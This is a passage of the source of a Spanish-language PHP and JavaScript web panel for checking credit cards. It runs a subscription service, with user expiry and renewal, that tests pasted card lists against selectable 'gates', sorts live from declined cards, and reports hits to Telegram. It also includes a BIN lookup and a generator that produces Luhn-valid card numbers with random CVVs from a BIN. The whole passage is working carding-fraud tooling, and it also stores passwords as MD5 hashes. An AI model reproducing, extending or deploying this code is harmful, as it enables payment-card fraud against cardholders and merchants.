                            var time = timeMatch ? " " + timeMatch[1] : "";
                            var username = "<?php echo $_SESSION['username']; ?>";
                       
// Obtener el texto visible del <option> seleccionado
const selectedGate = $("#api-select option:selected").text();

// Verificar que el gate no sea el placeholder (-- 🔥Gates🔥 --)
if (selectedGate !== "-- 🔥Gates🔥 --") {
    // Enviar el texto visible como "gate"
    $.ajax({
        url: 'send_telegram.php',
        type: 'POST',
        data: {
            card: card,
            time: time,
            username: username,
            telegram_id: "<?php echo $users[$_SESSION['username']]['telegram_id'] ?? ''; ?>",
            gate: selectedGate // Enviar el texto visible del <option>
        },
        success: function(response) {
            console.log("Información enviada a Telegram");
        },
        error: function(error) {
            console.error("Error al enviar la información a Telegram");
        }
    });
} else {
    console.error("Por favor, selecciona un gate válido.");
}
                        } else if (response.indexOf("Declined") >= 0) {
                            dies++;
                            $("#dies").append(response + "<br>");
                            $("#estatus").attr("class", "badge badge-danger").text(card + " -> RECHAZADA");
                            toastr.error("¡Rechazada! " + card);
                        } else {
                            errors++;
                            $("#errors").append(response + "<br>");
                            $("#estatus").attr("class", "badge badge-warning").text(card + " -> ERROR");
                            toastr.warning("¡Ocurrió un error! " + card);
                            errorSound.play();
                        }
                    } else {
                        errors++;
                        toastr.error("¡Error al conectar con la API!");
                        errorSound.play();
                    }
                    updateCounters();
                });

                $("#card_list").val(card_list.slice(tested).join('\n'));
                testCards(card_list, threadCount);
            });
        }

        function enableControls() {
            $("#chk-start").prop('disabled', !$("#api-select").val());
            $("#chk-clean").prop('disabled', false);
            $("#chk-stop").prop('disabled', true);
            // $("#chk-pause").prop('disabled', true);
        }

        $("#chk-start").click(function() {
            let card_list_input = $('#card_list').val().trim();
            let selectedApi = $("#api-select").val();
            let threadCount = parseInt($("#thread-select").val());

            if (!selectedApi) {
                toastr.warning("¡Selecciona una API antes de iniciar!");
                $("#api-select").focus();
                return;
            }
            if (!card_list_input) {
                toastr.warning("¡Inserta una lista para probar!");
                $('#card_list').focus();
                return;
            }

            let card_list = card_list_input.split('\n').filter(line => line.trim() !== '');
            if (card_list.length > MAX_LINES) {
                toastr.error(`¡Límite de ${MAX_LINES} líneas excedido!`);
                return;
            }

            audioStart.play();
            total = card_list.length;
            threadCount = Math.min(threadCount, total);
            stopped = false;
            paused = false;
            tested = lives = dies = errors = 0;

            $("#chk-stop").prop('disabled', false);
            // $("#chk-pause").prop('disabled', false);
            $("#chk-start").prop('disabled', true);
            $("#chk-clean").prop('disabled', true);
            $("#estatus").attr("class", "badge badge-success").text("Checker iniciado...");
            toastr.success("Checker iniciado!");
            testCards(card_list, threadCount);
        });

        // $("#chk-pause").click(function() {
        //     paused = true;
        //     $("#chk-start").prop('disabled', false);
        //     $("#chk-pause").prop('disabled', true);
        //     toastr.info("¡Checker en pausa!");
        //     $("#estatus").attr("class", "badge badge-info").text("Checker en pausa...");
        // });

        $("#chk-stop").click(function() {
            audioStop.play();
            stopped = true;
            enableControls();
            toastr.info("¡Checker detenido!");
            $("#estatus").attr("class", "badge badge-secondary").text("Checker detenido...");
        });

        $("#chk-clean").click(function() {
            tested = total = lives = dies = errors = 0;
            stopped = true;
            updateCounters();
            $("#card_list").val("");
            $("#lives").html("");
            $("#dies").html("");
            $("#errors").html("");
            toastr.info("¡Checker limpiado!");
        });

        $("#copyButton").click(function() {
            navigator.clipboard.writeText($('#lives').text())
                .then(() => toastr.success('Copiado al portapapeles!'))
                .catch(() => toastr.error('Error al copiar!'));
        });

        let currentUser;

        $("#confirmAddBtn").click(function() {
            $.ajax({
                url: '?page=admin',
                type: 'POST',
                data: $("#addUserForm").serialize() + '&add_user=1',
                success: function() {
                    toastr.success('Usuario añadido con éxito!');
                    $('#confirmAddModal').modal('hide');
                    setTimeout(() => location.reload(), 1000);
                },
                error: function() {
                    toastr.error('Error al añadir usuario!');
                }
            });
        });

        $('.delete-user').click(function() {
            currentUser = $(this).data('user');
            $('#deleteUserName').text(currentUser);
            $('#confirmDeleteModal').modal('show');
        });

        $("#confirmDeleteBtn").click(function() {
            $.ajax({
                url: '?page=admin&delete=' + currentUser,
                type: 'GET',
                success: function() {
                    toastr.success('Usuario eliminado con éxito!');
                    $('#confirmDeleteModal').modal('hide');
                    $(`tr[data-user="${currentUser}"]`).remove();
                },
                error: function() {
                    toastr.error('Error al eliminar usuario!');
                }
            });
        });

        $('.edit-user').click(function() {
            currentUser = $(this).data('user');
            $('#editUserName').text(currentUser);
            $('#editUserModal').modal('show');
        });

        $("#confirmEditBtn").click(function() {
            $.ajax({
                url: '?page=admin',
                type: 'POST',
                data: {
                    edit_user: currentUser,
                    new_password: $('#editPassword').val()
                },
                success: function() {
                    toastr.success('Contraseña cambiada con éxito!');
                    $('#editUserModal').modal('hide');
                },
                error: function() {
                    toastr.error('Error al cambiar contraseña!');
                }
            });
        });

        $('.renew-user').click(function() {
            currentUser = $(this).data('user');
            $('#renewUserName').text(currentUser);
            $('#renewUserModal').modal('show');
        });

        $("#confirmRenewBtn").click(function() {
            let expiration = $('#renewDate').val();
            if (!expiration) {
                const days = $('#renewDays').val();
                expiration = new Date();
                expiration.setDate(expiration.getDate() + parseInt(days));
                expiration = expiration.toISOString().split('T')[0];
            }
            $.ajax({
                url: '?page=admin',
                type: 'POST',
                data: {
                    renew_user: currentUser,
                    expiration: expiration
                },
                success: function() {
                    toastr.success('Suscripción renovada con éxito!');
                    $('#renewUserModal').modal('hide');
                    $(`tr[data-user="${currentUser}"] td:eq(1)`).text(expiration);
                },
                error: function() {
                    toastr.error('Error al renovar suscripción!');
                }
            });
        });

        document.getElementById('btn-generator').addEventListener('click', function() {
            document.getElementById('generator-popup').style.display = 'block';
        });

        document.getElementById('close-generator').addEventListener('click', function() {
            document.getElementById('generator-popup').style.display = 'none';
        });

// Mostrar la ventana de Info BIN
document.getElementById('btn-bin-info').addEventListener('click', function() {
    document.getElementById('bin-info-popup').style.display = 'block';
});

// Cerrar la ventana de Info BIN
document.getElementById('close-bin-info').addEventListener('click', function() {
    document.getElementById('bin-info-popup').style.display = 'none';
});

// Función para consultar el BIN
document.getElementById('chk-bin-info').addEventListener('click', function() {
    const bin = document.getElementById('bin-input-info').value;
    if (bin.length === 6 && /^\d+$/.test(bin)) {
        fetch('bin_lookup.php', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/x-www-form-urlencoded',
            },
            body: `bin=${bin}`,
        })
        .then(response => response.text())
        .then(data => {
            document.getElementById('bin-info-result').innerHTML = data;
        })
        .catch(error => {
            document.getElementById('bin-info-result').innerHTML = `<div class="alert alert-danger">Error al consultar el BIN.</div>`;
        });
    } else {
        document.getElementById('bin-info-result').innerHTML = `<div class="alert alert-danger">El BIN debe tener exactamente 6 dígitos numéricos.</div>`;
    }
});

        function generateRemainingDigits(bin) {
            const remainingLength = 16 - bin.length;
            let remainingDigits = '';
            for (let i = 0; i < remainingLength; i++) {
                remainingDigits += Math.floor(Math.random() * 10);
            }
            return remainingDigits;
        }

        function generateValidCardNumber(bin) {
            let cardNumber;
            do {
                const remainingDigits = generateRemainingDigits(bin);
                cardNumber = bin + remainingDigits;
            } while (!isValidCardNumber(cardNumber));
            return cardNumber;
        }

        function isValidCardNumber(cardNumber) {
            let sum = 0;
            let shouldDouble = false;
            for (let i = cardNumber.length - 1; i >= 0; i--) {
                let digit = parseInt(cardNumber.charAt(i), 10);
                if (shouldDouble) {
                    digit *= 2;
                    if (digit > 9) digit = (digit % 10) + 1;
                }
                sum += digit;
                shouldDouble = !shouldDouble;
            }
            return sum % 10 === 0;
        }

        function generateCVV() {
            return String(Math.floor(Math.random() * 900) + 100);
        }

        function generateAndPasteCards() {
            const bin = document.getElementById('bin-input').value;
            const month = document.getElementById('month-select').value;
            const year = document.getElementById('year-select').value;
            const cvv = document.getElementById('cvv-input').value;
            const quantity = document.getElementById('quantity-input').value;

            if (bin.length < 6 || bin.length > 15 || quantity <= 0) {
                alert("Por favor, completa todos los campos correctamente.");
                return;
            }

            const cardList = document.getElementById('card_list');
            let generatedCards = '';
            for (let i = 0; i < quantity; i++) {
                const cardNumber = generateValidCardNumber(bin);
                const cardCVV = cvv || generateCVV();
                const card = `${cardNumber}|${month}|${year}|${cardCVV}`;
                generatedCards += card + '\n';
            }
            cardList.value += generatedCards.trim();
        }

        document.getElementById('chk-generator').addEventListener('click', generateAndPasteCards);
    });

    <?php 
    if ($is_admin_page && $admin_logged) {
        if (isset($_POST['add_user'])) {
            $new_username = trim($_POST['new_username']);
            $new_password = trim($_POST['new_password']);
            $expiration = trim($_POST['expiration']);
            $telegram_id = trim($_POST['telegram_id']);
            if (!isset($users[$new_username])) {
                $users[$new_username] = [
                    'password' => md5($new_password),
                    'expiration' => $expiration,
                    'last_login' => 'Never',
                    'telegram_id' => $telegram_id
                ];
                saveUsers($users, $users_file);
                saveLog('admin', "User $new_username added");
                echo json_encode(['status' => 'success', 'message' => 'User added successfully!']);
            } else {
                echo json_encode(['status' => 'error', 'message' => 'User already exists!']);
            }
            exit;
        }

        if (isset($_GET['delete'])) {
            $user_to_delete = $_GET['delete'];
            if (isset($users[$user_to_delete]) && $user_to_delete !== 'admin') {
                unset($users[$user_to_delete]);
                saveUsers($users, $users_file);
                saveLog('admin', "User $user_to_delete deleted");
            }
        }

        if (isset($_POST['renew_user'])) {
            $user_to_renew = $_POST['renew_user'];
            if (isset($users[$user_to_renew])) {
                $users[$user_to_renew]['expiration'] = $_POST['expiration'];
                saveUsers($users, $users_file);
                saveLog('admin', "User $user_to_renew renewed");
            }
        }

        if (isset($_POST['edit_user']) && isset($_POST['new_password'])) {
            $user_to_edit = $_POST['edit_user'];
            if (isset($users[$user_to_edit])) {
                $users[$user_to_edit]['password'] = md5($_POST['new_password']);
                saveUsers($users, $users_file);
                saveLog('admin', "Password for user $user_to_edit changed");
            }
        }
    }
    ?>
    </script>
</body>
</html>